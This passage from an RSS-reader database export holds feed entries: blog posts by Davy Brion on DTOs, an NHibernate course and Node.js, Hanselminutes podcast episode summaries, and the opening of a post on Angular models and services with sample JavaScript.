src=\"http://feeds.feedburner.com/~ff/davybrion?i=4BpBYXj8pYY:lkkPo1JSHCM:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=4BpBYXj8pYY:lkkPo1JSHCM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=4BpBYXj8pYY:lkkPo1JSHCM:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/4BpBYXj8pYY\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1107}}
{"k":"0000000084","o":"0000005808","v":"001"}
{"_id":1108,"_uid":1108,"_dt":1373742620874,"_s":"d206c172964793dddf45b29eaca89fdc"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/wDCy16gD6Uc/","title":"DTO’s Should Transfer Data, Not Entities","published":{"$wrap":"$date","v":1329679937000,"h":"2012-02-19T19:32:17.000Z"},"starred":false,"read":false,"content":"<p>I've read a couple of posts recently where the authors were complaining about excessive mapping to DTO's and whether or not it's worth it. I've been a fan of DTO's for a long time, but I'm not a fan of how I frequently see them being used. More specifically, I very much dislike the all-too-common approach of creating a DTO for each entity in your domain model. In the worst cases, the DTO's actually reference each other and try too hard to mimic the structure of the entities. For example, an OrderDto which has a reference to a CustomerDto and a collection of OrderLineDto instances. In those cases, I absolutely agree that all of the mapping involved introduces way too much ceremony to the codebase without really offering any concrete benefits.</p><p>Of course, it really depends on the architecture of your system.  If you're using services that are only used by the front-end of your system, then I'd still advise against making those entities available outside of the service boundary for reasons that I've discussed <ahref=\"http://davybrion.com/blog/2010/05/why-you-shouldnt-expose-your-entities-through-your-services/\">earlier</a>. That doesn't mean that you should go the entity-mimicking-DTO-route though. In fact, entity-mimicking-DTO's introduce a few of the same downsides you'd get from exposing entities directly through  your services. For an 'internal' service (i.e. only used by <em>your</em> application), I think it makes a lot more sense to use DTO's per service operation which are optimized for the use case that that service operation is meant to implement.</p><p>Essentially, an internal service's operations will be either <em>queries</em> or <em>commands</em>. When it comes to queries, why not just do the simplest thing possible? In most cases, it's sufficient to just return the data in the exact same form that the data will be displayed in. Quite often, that means a denormalized set of data where the data comes from more than one type of entity/table. There's no reason to send a bunch of entity-mimicking DTO's that reference each other to the client if you're going to use the data to populate a grid. Just send a list of DTO's which are already in the most optimal form. Populating those DTO's can then simply be done through straight SQL, a view, a stored procedure, a <ahref=\"http://davybrion.com/blog/2010/09/think-twice-before-you-map-entities-to-dtos/\">projection through your ORM</a>, a map/reduce operation, or whatever else that makes sense. The point is that in most cases, you should just <em>populate</em> those DTO's as directly as you can instead of <em>mapping</em> to those DTO's. In this case, the DTO's offer a clear-cut benefit and don't really introduce tedious ceremony code in your codebase.</p><p>As for the commands (inserts, updates, anything that <em>creates</em> something or results in something <em>happening</em>), why even use DTO's in the first place? People will often argue that the ability to reuse the entity-mimicking-DTO's for these operations is a benefit. Personally, I don't really see the benefit. The mere presence of entity-mimicking-DTO's only encourages people to use them for the queries as well. Instead, I prefer to go with types that encapsulate all of the data relevant to the current command (the data to be inserted/updated, or whatever else the command needs). In a very simple scenario, this could be an InsertCustomerCommand type which simply has properties for the data that needs to be inserted. Nobody will be confusing these types with any other purpose than what their name communicates.</p><p>If you're building a web app where the server-side code does everything in process (i.e. without a WCF service), then you can in many cases just use the entities directly without a real drawback, though I'd recommend keeping an eye on unexpected select N+1 problems, since those will frequently come up when you're preparing your views. But even in this case, using DTO's that are optimized for the scenarios in which they're being used can really simplify the query-side of your system a lot.</p><p>There's nothing inherently wrong with DTO's if you use them to simply transfer <em>data</em>. If you're using them to transfer entities, you're robbing yourself of their biggest benefit while only making things more complex than they need to be.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/wDCy16gD6Uc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1108}}
{"k":"0000000084","o":"0000002095","v":"001"}
{"_id":1109,"_uid":1109,"_dt":1373742620874,"_s":"664759acd1252304a8b9874044995449"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/HKKd471Hr00/","title":"NHibernate Training Course In Mechelen, Belgium – April 23/25","published":{"$wrap":"$date","v":1329062866000,"h":"2012-02-12T16:07:46.000Z"},"starred":false,"read":false,"content":"<p>I'm organizing a public NHibernate Training Course from April 23rd through April 25th in Mechelen, Belgium. This time, I'm taking care of the whole thing myself instead of working together with a more established training company (except for renting a suitable training location). This enables me to offer the course at a lower price than the previous public course. All details can be found <ahref=\"http://thatextramile.be/training/nhibernate\">here</a>. Feel free to spread the word! <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=HKKd471Hr00:M3XrImatP4I:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=HKKd471Hr00:M3XrImatP4I:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=HKKd471Hr00:M3XrImatP4I:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=HKKd471Hr00:M3XrImatP4I:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/HKKd471Hr00\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1109}}
{"k":"0000000084","o":"0000006550","v":"001"}
{"_id":1110,"_uid":1110,"_dt":1373742620875,"_s":"c8ad8da5d2394b4f76029ae42805c2c1"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/AsPaZvBN6HA/","title":"Node.js For Dummies","published":{"$wrap":"$date","v":1324230039000,"h":"2011-12-18T17:40:39.000Z"},"starred":false,"read":false,"content":"<p>I'm sure you've all heard of Node.js by now. Its popularity is increasing rapidly, which means it's a good idea to be aware of what Node.js is and especially how it differs from more traditional technology stacks. In this post, I'll try to give an easy-to-understand overview of what makes Node.js different and make it clear that it's more than just server-side JavaScript. Note that this overview is highly simplified and only meant to help people understand how Node.js works. This is definitely not a completely accurate description of the lower-level details of Node.js.</p><h2>Evented/Asynchronous I/O</h2><p>In most technology stacks, API calls for I/O operations are synchronous. As in, the thread that executes the operation is blocked for the duration of the I/O operation until that operation has completed. Once completed, execution of your code proceeds. Of course, a lot of technology stacks have asynchronous variants of those operations available as well, but generally speaking, they aren't used as often as the synchronous variants. In Node.js, it's the other way around. All I/O operations are asynchronous and there are only a few synchronous implementations available (and you're generally discouraged from using them).</p><p>This means that whenever you do an I/O operation (file manipulation, network requests, database operations, etc…), Node.js initiates the I/O operation through a lower-level C/C++ layer which will perform the operation asynchronously. Once the operation has completed, Node.js will execute your callback function that you passed as a parameter to the I/O operation's function call. The important thing here is that while the I/O operation is being executed, Node.js doesn't have to wait for the operation to complete, and is able to focus entirely on processing other events. And those events can be anything: incoming network requests, executing callbacks from other operations that have completed, or invoking whatever function that is assigned to a particular event.</p><h2>Eventloop</h2><p>The Node.js eventloop is what makes Node.js so interesting and powerful. Node.js basically just keeps reading from an event queue until that queue is empty. As it loops through the events to be processed, it invokes the JavaScript functions that have been assigned for those events. If any of those functions performs an I/O operation, Node.js will initiate the operation and then immediately move to the next event in the event queue. Once the I/O operation has completed, an event will be added to the event queue with a reference to your original callback. Once all preceding events have been processed, Node.js will get to the newly added event and invoke your callback. Because all I/O operations are asynchronous, this enables Node.js to maximize its efficiency as it processes events because it doesn't need to wait for slow I/O operations to complete.</p><h2>Single-threaded</h2><p>One thing that people don't always realize is that the Node.js eventloop is single-threaded. This has some nice benefits but there's a huge drawback as well. The biggest benefit is that you don't need to worry about concurrent access to shared state. After all, there is never more than 1 thread executing your JavaScript functions. This means you don't have to write any locking code to protect shared state. The drawback to the single-threaded eventloop is that you need to be careful not to block the event loop. If you're planning on doing heavy synchronous processing in your JavaScript code, you need to realize that no other events can be processed by Node.js until that synchronous block of code has completed. Obviously, since there's only one thread going through the eventloop, any delay you cause in your code can be very costly to overall throughput and performance. For now, it's best to execute synchronous processing routines as a child process, possibly even in a language that is more suitable for this than JavaScript. But it seems that future Node.js versions will provide a more integrated way to deal with this.</p><h2>Why JavaScript?</h2><p>JavaScript's support of closures and it treating functions as first class objects means it's ideally suited for the evented programming model that Node.js offers. Many people still think of JavaScript as a joke or a toy language, but it's a lot more powerful than many people think it is. Yes, it certainly has problems as well, but it's definitely worth learning. I do hope that this post has made it clear that there's a lot more to Node.js than simply being server-side JavaScript. What makes Node.js so interesting are the principles that I've tried to explain in this post. Those principles can be implemented with other languages as well, and could be made to work just as great as, or perhaps even greater than Node.js itself. But you'd be hard-pressed to find a language that's so ubiquitous, yet completely devoid of a pre-existing synchronous I/O infrastructure.</p><p>Anyways, I hope I succeeded at making it somewhat clear how Node.js works and why it's so different from most other technology stacks.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/AsPaZvBN6HA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1110}}
{"k":"0000000084","o":"0000000817","v":"001"}
{"_id":1111,"_uid":1111,"_dt":1373742620875,"_s":"4566bc4534c431a3cb42ad23f2de48e0"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/U70DcFPlqZc/default.aspx","title":"The Future and Past of Computing with Dan Bricklin","published":{"$wrap":"$date","v":1372906238000,"h":"2013-07-04T02:50:38.000Z"},"starred":false,"read":false,"content":"Scott sits down with Computing Pioneer and VisiCalc developer Dan Bricklin. Dan also wrote the popular iPad application Note Taker HD and has recently joined Alpha Corporation as their CTO.Dan and Scott chat about Douglas Engelbart, the invention of the mouse, and the myriad of computing innovations that we've enjoyed since the 60s.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/U70DcFPlqZc\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1111}}
{"k":"0000000084","o":"0000000708","v":"001"}
{"_id":1112,"_uid":1112,"_dt":1373742620875,"_s":"513e81e1770515eff4f4116012e8e786"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/f_szoTtvnUA/default.aspx","title":"Hanselminutiae 12 with Richard Campbell - The post-BUILD show","published":{"$wrap":"$date","v":1372716157000,"h":"2013-07-01T22:02:37.000Z"},"starred":false,"read":false,"content":"BUILD week is over, so Scott and Richard get together to talk it out. What's the deal with these new 8\" tablets? Will Apple get Live Tiles? What about smart Agent technology...does my phone know too much about me?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/f_szoTtvnUA\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1112}}
{"k":"0000000084","o":"0000000816","v":"001"}
{"_id":1113,"_uid":1113,"_dt":1373742620875,"_s":"d47306b4437cea6c408d35f7af4994ed"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/s1gsjEd79OU/default.aspx","title":"Open Sourcing Web Essentials - Mads Kristensen and the Front End Developer","published":{"$wrap":"$date","v":1372313204000,"h":"2013-06-27T06:06:44.000Z"},"starred":false,"read":false,"content":"Scott sits down with Mads Kristensen and talks about his new open sourced Web Essentials. Web Essentials adds dozens of new features to Visual Studio for the Front End Developer...and now it's open source! We also talk Visual Studio 2013 and the new project Codenamed Artery that's posed to change everything.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/s1gsjEd79OU\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1113}}
{"k":"0000000084","o":"0000000705","v":"001"}
{"_id":1114,"_uid":1114,"_dt":1373742620875,"_s":"45f1eaca297ab7b05de4e7a502864ba6"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/uomLNx4HU_I/default.aspx","title":"A gentle introduction to node.js with Raquel Velez","published":{"$wrap":"$date","v":1371238978000,"h":"2013-06-14T19:42:58.000Z"},"starred":false,"read":false,"content":"Scott's attending the jQuery Conference this week so Raquel Velez takes a moment before her node.js talk and explains the why node, why now, and what .NET developers should think about the rise of JavaScript on the server.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/uomLNx4HU_I\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1114}}
{"k":"0000000084","o":"0000000735","v":"001"}
{"_id":1115,"_uid":1115,"_dt":1373742620875,"_s":"b330e001dffa48fd89f5f00e03f820e5"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/MSrOg1zkhPc/default.aspx","title":"On Culture and Remoteness at GitHub with Paul Betts and Justin Spahr-Summers","published":{"$wrap":"$date","v":1371182400000,"h":"2013-06-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott's in the Bay Area today talking to Paul Betts and Justin Spahr-Summers at GitHub. What is it about GitHub's culture that makes it work so well? Is it tools or culture or both? Are remote workers fully accepted at GitHub?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/MSrOg1zkhPc\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1115}}
{"k":"0000000084","o":"0000000814","v":"001"}
{"_id":1116,"_uid":1116,"_dt":1373742620875,"_s":"fbe96df84244ab0553c49d37f65ccd34"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/Sh2ydX5rFJ4/default.aspx","title":"Big Data, Low Power - Analyzing Hard Drive Energy Consumption with Dr. Anthony Hylick","published":{"$wrap":"$date","v":1370577600000,"h":"2013-06-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Our clouds demand more storage capacity and more power, but do we really understand where that power is expended? How is power used by modern hard drives and where can savings be found? Scott talks to IBM Researcher Dr. Anthony Hylick about his work in the space of hard drive energy consumption.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/Sh2ydX5rFJ4\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1116}}
{"k":"0000000084","o":"0000001054","v":"001"}
{"_id":1117,"_uid":1117,"_dt":1373742620875,"_s":"7aa3cb439bdf1cee6a5db520f28a69fb"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/wJYib3UQZ40/default.aspx","title":"A Desktop Developer moves to the Web - with Mark Rendle","published":{"$wrap":"$date","v":1369972800000,"h":"2013-05-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Rendle has a twenty year career developing software for the desktop. He's long believed that the web just isn't meant for applications of any import. Until now. What changed in web development that caused Mark to take another look at the web and completely change his tune?NOTE: Mark is offering a discount code for HM listeners. It's \"HM20\" and is good for 20% off the first year of an annual subscription. For UK listeners that'll be £40 instead of £50, US $64 instead of $80. The code can be used at the payments page after the 30 day free trial expires.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/wJYib3UQZ40\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1117}}
{"k":"0000000084","o":"0000000728","v":"001"}
{"_id":1118,"_uid":1118,"_dt":1373742620876,"_s":"5978b5e0974c6b0ec571f22819e06c16"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/tfdy7CU_-TE/default.aspx","title":"Bacon is bad for you - On Developer Monoculture with Garann Means","published":{"$wrap":"$date","v":1368158400000,"h":"2013-05-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott talks to Garann Means. Garann is a front end developer who recently spoke at a conference called \"Devs Love Bacon.\" Her topic? \"Bacon is bad for you.\" She talks about developer monoculture and how it puts us all at risk.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/tfdy7CU_-TE\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1118}}
{"k":"0000000084","o":"0000000809","v":"001"}
{"_id":1119,"_uid":1119,"_dt":1373742620876,"_s":"3b843c45a44967219daa3bf0fc4c58f2"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/HUAqK03x164/default.aspx","title":"Integrating Office and the Open Web with Lucidchart's Brian Pugh","published":{"$wrap":"$date","v":1368763200000,"h":"2013-05-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Lucidchart offers high quality flowcharting and diagramming on the Open Web. It's all JavaScript and it's all in your browser. Now Lucidchart integrates into Office 2013! How does this non-Microsoft tech web app integrate into a desktop app in 2013? Brian Pugh tells us how. Now why isn't your web app in Office?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/HUAqK03x164\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1119}}
{"k":"0000000084","o":"0000000656","v":"001"}
{"_id":1120,"_uid":1120,"_dt":1373742620935,"_s":"b077063290d16888fa69c12883292098"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/484N9bt2UZE/default.aspx","title":"WordPress and Internet Security with Kellep Charles","published":{"$wrap":"$date","v":1367553600000,"h":"2013-05-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott talks to Security Consultant Kellep Charles about WordPress and public website security. What can you do to protect yourself? Where does internet security break down?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/484N9bt2UZE\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1120}}
{"k":"0000000084","o":"0000000793","v":"001"}
{"_id":1121,"_uid":1121,"_dt":1373742620935,"_s":"e8cf498a9e6bfd704bece90a9f45f25b"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/QsLDpeMPpuM/default.aspx","title":"MonoGame and Xamarin make shipping Infinite Flight a reality","published":{"$wrap":"$date","v":1366948800000,"h":"2013-04-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott's at the Xamarin Evolve conference and talks to Dean Ellis who works on the MonoGame framework and Philippe Rollin from Infinite Flight. Philippe, along with business partner Matthieu Laban have created an amazing flight simulator using C# that's available in AppStores now! How did they do it?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/QsLDpeMPpuM\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1121}}
{"k":"0000000084","o":"0000000723","v":"001"}
{"_id":1122,"_uid":1122,"_dt":1373742620935,"_s":"adecebfe32dcbcb8ab4d7373230d4c0a"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/x1BMvlR7ONk/default.aspx","title":"Approval Tests with Llewellyn Falco","published":{"$wrap":"$date","v":1362110400000,"h":"2013-03-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott is at the Agile Open Northwest open spaces conference with Llewellyn Falco this week. He talks to Llewellyn about his \"Approval Tests\" open source project. It's a polyglot framework to make test verification much easier when Assert() isn't enough.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/x1BMvlR7ONk\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1122}}
{"k":"0000000084","o":"0000033852","v":"001"}
{"_id":1123,"_uid":1123,"_dt":1373742620936,"_s":"7cbcf4ce0d4e70bb1f93c39b90934c17"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/VvpPVADxNBA/models-and-services-in-angular","title":"Models and Services in Angular","published":{"$wrap":"$date","v":1366902000000,"h":"2013-04-25T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>It can be confusing when trying to structure a client-side application, especially when it comes to separating models from controllers and services. Doing this in Angular means diving into some details.</p><p><img src='http://wekeroad.com/images/rocket_builder.jpg'/></p><p><p><i>Image from<a href=\"http://union-bulletin.com/news/2012/aug/03/one-part-science-one-part-excitement-equal-success/\">http://union-bulletin.com/news/2012/aug/03/one-part-science-one-part-excitement-equal-success/</a></i></p><h2>What's a Model? What's a Service?</h2><p>I read over a post by Joel Hooks today called<a href=\"http://joelhooks.com/blog/2013/04/24/modeling-data-and-state-in-your-angularjs-application/\">Modeling Data and State in Your AngularJS Application</a>and the idea was put forward that you can clean up your Controllers by (basically) using Angular's service as a model.</p><p>The idea is a good one:<strong>Clean Controllers are Godly Controllers</strong>but there's some confusion in the post that I think will end up spreading.</p><p>Straight up-front:<strong>All services (service(), factory(), provider()) in Angular are SINGLETONS</strong>. It's difficult under any circumstances to consider a Singleton as a model.</p><p>There are so many jargon-filled terms disseminated throughout different approaches to software design... but I think we can agree that a model is representative of data (as opposed to a Domain Model which is all of your stuff under a big umbrella).</p><p>In the post above, Joel has a list of authors and a quote from each one - a simple data structure:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">fowler</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Fowler\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Any fool can write code that a computer can understand. Good programmers write code that humans can understand.\"</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">twain</span><span class=\"o\">=</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Twain\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">quote</span><span class=\"o\">:</span><span class=\"s2\">\"Why, I have known clergymen, good men, kind-hearted, liberal, sincere, and all that, who did not know the meaning of a'flush.' It is enough to make one ashamed of one's species.\"</span></span><span class='line'><span class=\"p\">};</span></span></code></pre></td></tr></table></div></figure><p>One might consider this list to be two instances of a single Model, Author:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span><span class='line-number'>16</span><span class='line-number'>17</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">Author</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">atts</span><span class=\"p\">){</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">self</span><span class=\"o\">=</span><span class=\"k\">this</span><span class=\"p\">;</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">initialSettings</span><span class=\"o\">=</span><span class=\"nx\">atts</span><span class=\"o\">||</span><span class=\"p\">{};</span></span><span class='line'><span class=\"c1\">//initial settings if passed in</span></span><span class='line'><span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span><span class=\"nx\">setting</span><span class=\"k\">in</span><span class=\"nx\">initialSettings</span><span class=\"p\">){</span></span><span class='line'><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">initialSettings</span><span class=\"p\">.</span><span class=\"nx\">hasOwnProperty</span><span class=\"p\">(</span><span class=\"nx\">setting</span><span class=\"p\">))</span></span><span class='line'><span class=\"nx\">self</span><span class=\"p\">[</span><span class=\"nx\">setting</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"nx\">initialSettings</span><span class=\"p\">[</span><span class=\"nx\">setting</span><span class=\"p\">];</span></span><span class='line'><span class=\"p\">};</span></span><span class='line'></span><span class='line'><span class=\"c1\">//with some logic...</span></span><span class='line'><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">fullName</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">first</span><span class=\"o\">+</span><span class=\"s2\">\"\"</span><span class=\"o\">+</span><span class=\"nx\">self</span><span class=\"p\">.</span><span class=\"nx\">last</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"c1\">//return the scope-safe instance</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">self</span><span class=\"p\">;</span></span><span class='line'><span class=\"p\">};</span></span></code></pre></td></tr></table></div></figure><p>Translating this to Joel's code:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span 